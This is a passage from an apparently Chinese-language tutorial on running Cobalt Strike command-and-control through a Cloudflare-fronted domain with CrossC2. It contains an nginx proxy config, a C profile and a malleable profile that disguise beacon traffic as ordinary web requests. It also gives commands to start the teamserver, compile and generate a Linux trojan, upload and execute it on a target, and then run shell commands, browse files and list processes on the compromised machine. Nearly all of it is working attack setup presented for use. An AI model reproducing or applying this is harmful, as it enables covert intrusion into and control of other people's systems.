        location /aaaaaaaaa { # 限定 c2profile 请求地址
            proxy_pass https://127.0.0.1:9090/aaaaaaaaa;
            expires off;
            proxy_redirect off;
            proxy_set_header X-Forworded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Real-IP $remote_addr;
        }
        location /bbbbbbbbb {
            proxy_pass https://127.0.0.1:9090/bbbbbbbbb;
            expires off;
            proxy_redirect off;
            proxy_set_header X-Forworded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Real-IP $remote_addr;
        }
    }
    }
    #mail {
    #   # See sample authentication script at:
    #   # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript
    # 
    #   # auth_http localhost/auth.php;
    #   # pop3_capabilities "TOP" "USER";
    #   # imap_capabilities "IMAP4rev1" "UIDPLUS";
    # 
    #   server {
    #       listen     localhost:110;
    #       protocol   pop3;
    #       proxy      on;
    #   }
    # 
    #   server {
    #       listen     localhost:143;
    #       protocol   imap;
    #       proxy      on;
    #   }
    #}
    //重启nginx配置
    sudo nginx -s reload
    //重启nginx服务
    sudo systemctl restart nginx.service
### c2profile.c配置
    // 采用示例模版，修改域名为真实域名
    // www.google.com -> www.xxx.tk
    #include 
    #include 
    #include 
    #include 
    void cc2_rebind_http_get_send(char *reqData, char **outputData, long long *outputData_len) {
    printf("cc2_get_send\n");
        char *requestBody = "GET /%s HTTP/1.1\r\n"
            "Host: www.xxx.tk\r\n"
            "Accept-Encoding: gzip, br\r\n"
            "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.163 Safari/535.1\r\n"
            "Cookie: SESSION=%s\r\n"
            "Connection: close\r\n\r\n";
        char postPayload[20000];
        sprintf(postPayload, requestBody, "aaaaaaaaa", reqData);
        *outputData_len =  strlen(postPayload);
        *outputData = (char *)calloc(1,  *outputData_len);
        memcpy(*outputData, postPayload, *outputData_len);
    }
    void cc2_rebind_http_post_send(char *reqData, char *id, char **outputData, long long *outputData_len) {
    printf("cc2_post_send\n");
        char *requestBody = "POST /%s?SESSION=%s HTTP/1.1\r\n"
            "Host: www.xxx.tk\r\n"
            "Accept-Encoding: gzip, br\r\n"
            "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.163 Safari/535.1\r\n"
            "Connection: close\r\n"
            "Content-Length: %d\r\n\r\n%s";
        char *postPayload = (char *)calloc(1, strlen(requestBody)+strlen(reqData)+200);
        sprintf(postPayload, requestBody, "bbbbbbbbb", id, strlen(reqData), reqData);
        *outputData_len =  strlen(postPayload);
        *outputData = (char *)calloc(1,  *outputData_len);
        memcpy(*outputData, postPayload, *outputData_len);
        free(postPayload);
    }
    char *find_payload(char *rawData, long long rawData_len, char *start, char *end, long long *payload_len) {
        if (rawData != NULL) {
        char *s = strstr(rawData, start);
        char *e = strstr(rawData, end);
        if (s && e) {
            rawData = s + strlen(start);
            *payload_len = strlen(rawData) - strlen(e);
            char *payload = (char *)calloc(*payload_len ,sizeof(char));
            memcpy(payload, rawData, *payload_len);
            return payload;
        }
    }
    *payload_len = 0;
    return NULL;
    }
    void cc2_rebind_http_get_recv(char *rawData, long long rawData_len, char **outputData, long long *outputData_len) {
    printf("cc2_get_recv\n");
        char *start = "ffffffff1";
        char *end = "eeeeeeee2";
        long long payload_len = 0;
        *outputData = find_payload(rawData, rawData_len, start, end, &payload_len);
        *outputData_len = payload_len;
    }
    void cc2_rebind_http_post_recv(char *rawData, long long rawData_len, char **outputData, long long *outputData_len) {
    printf("cc2_post_recv\n");
        char *start = "ffffffff1";
        char *end = "eeeeeeee2";
        long long payload_len = 0;
        *outputData = find_payload(rawData, rawData_len, start, end, &payload_len);
        *outputData_len = payload_len;
    }
### cloudflare.profile配置
    https-certificate {
        set keystore "www.xxx.tk.store";
        set password "123456";
    }
    http-get {
        set uri "/aaaaaaaaa";
        set verb "GET";
        client {
            header "Accept" "accccccc";
            header "Host" "www.xxx.tk";
            header "Referer" "http://www.xxx.tk/";
            header "Accept-Encoding" "gzip, deflate";
            metadata {
                base64url;
                prepend "SESSION=";
                header "Cookie";
            }
        }
        server {
            header "Server" "nginx";
            header "Cache-Control" "max-age=0, no-cache";
            header "Pragma" "no-cache";
            header "Connection" "keep-alive";
            header "Content-Type" "charset=utf-8";
            output {
                base64;
                prepend "ffffffff1";
                append "eeeeeeee2";
                print;
            }
        }
    }
    http-post {
        set uri "/bbbbbbbbb";
        set verb "POST";
        client {
            header "Accept" "accccccc";
            header "Host" "www.xxx.tk";
            header "Referer" "http://www.xxx.tk/";
            header "Accept-Encoding" "gzip, deflate";
            id {
                base64;
                parameter "SESSION";
            }
            output {
                base64;
                print;
            }
        }
        server {
            header "Server" "nginx";
            header "Cache-Control" "max-age=0, no-cache";
            header "Pragma" "no-cache";
            header "Connection" "keep-alive";
            header "Content-Type" "charset=utf-8";
            output {
                mask;
                base64url;
                prepend "ffffffff1";
                append "eeeeeeee2";
                print;
            }
        }
    }
### 启动C2
1、启动C2服务器
    ./teamserver xx.xx.xx.xx 123456 cloudflare.profile
2、下载[CrossC2-GithubBot-2022-06-07.cna](https://github.com/gloxec/CrossC2/releases)，下载[CrossC2Kit_Loader.cna](https://github.com/gloxec/CrossC2/blob/v2.2.4/CrossC2Kit/CrossC2Kit_Loader.cna)，将其保存在Windows
CS客户端文件夹中
3、在Windows中启动客户端，依次加载CrossC2-GithubBot-2022-06-07.cna和CrossC2Kit_Loader.cna插件，加载后，右上角会出现CrossC2按钮
4、创建监听器，端口为9090
5、公网访问以下内容
    https://www.xxx.tk/ -> 200
    https://www.xxx.tk/aa -> 404
    https://www.xxx.tk/aaaaaaaaa -> 200
### 创建beacon
1、下载最新版[genCrossC2.Linux](https://github.com/gloxec/CrossC2/releases)，并将genCrossC2.Linux和c2profile.c放在C2服务器端
2、C2服务器中编译so文件
    gcc c2profile.c -o libc2.so -fPIC -shared
3、生成Linux木马，执行完成后会在当前生成a.out文件
    ./genCrossC2.Linux www.xxx.tk 443 .cobaltstrike.beacon_keys libc2.so Linux x64 a.out
### Linux机器上线
1、将生成的a.out上传到目标机器，赋予权限，然后执行。
    chmod +x a.out
    ./a.out
2、Linux机器成功上线
#### 命令交互操作
1、选中机器，鼠标右键`会话交互`，输入Linux命令即可
    shell whoami
    shell ifconfig
#### 文件操作
1、选中机器，鼠标右键`Expore -> 文件浏览器`，即可查看目标机器文件，还可以上传下载文件
#### 进程查看
1、选中机器，鼠标右键`Expore -> Process List`，即可查看目标机器进程